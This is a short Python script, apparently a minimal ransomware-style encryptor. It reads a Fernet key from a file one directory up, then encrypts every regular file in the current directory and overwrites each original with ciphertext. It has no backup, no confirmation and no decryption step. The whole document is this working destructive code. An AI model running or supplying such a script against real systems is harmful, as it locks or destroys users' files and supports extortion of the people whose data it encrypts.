import os
from cryptography.fernet import Fernet 
files= [file for file in os.listdir() if os.path.isfile(file)]

with open('../mykey', 'rb') as mykey:
  real_key=mykey.read()   
for file in files:
  with open(file, 'rb') as myfile:
    content=myfile.read()
  content_encrypted=Fernet(real_key).encrypt(content)
  with open(file, 'wb') as myfile:
      myfile.write(content_encrypted)